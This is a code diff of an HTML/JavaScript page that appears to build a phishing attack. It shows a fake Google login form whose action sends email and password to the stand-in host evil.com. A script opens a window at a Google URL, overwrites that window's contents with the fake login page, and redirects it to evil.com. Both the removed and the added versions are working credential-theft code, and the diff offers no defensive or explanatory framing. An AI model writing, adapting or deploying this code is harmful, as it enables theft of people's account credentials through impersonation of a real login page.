@@ -168,9 +168,9 @@
 
         <div id="messageBox" class="message-box"></div>
 
-        <form id="loginForm" method=get action="https://evil.com/">
-            <input type="email" id="email" name=email class="input-field" placeholder="Email or phone" required>
-            <input type="password" id="password" name=pass class="input-field" placeholder="Password" required>
+        <form id="loginForm" action="https://evil.com">
+            <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
+            <input type="password" id="password" class="input-field" placeholder="Password" required>
 
             <div class="text-left mb-6">
                 <a href="#" class="link-text">Forgot password?</a>
@@ -192,21 +192,23 @@
                     `;
 var j='';
 function start(){
-
-win = window.open(`about:blank`,`win`)
-
-setTimeout(()=>{
-win.location=`https://accounts.google.com/`; 
-},100);
+j = window.open(`https://www.google.com/search?q=account.google.com`,`j`)
 
 setTimeout(()=>{
-win.document.write(googleLoginPageHtml);
-},200);
+
+const intervalId = setInterval(() => {
+  try {
+    j.document.body.innerHTML=googleLoginPageHtml;
+    j.window.location='https://evil.com/'
+    clearInterval(intervalId);
+  } catch (error) {
+  }
+}, 100);
+
+},1500);
 
 }
-
 
     </script>
 </body>
 </html>
-
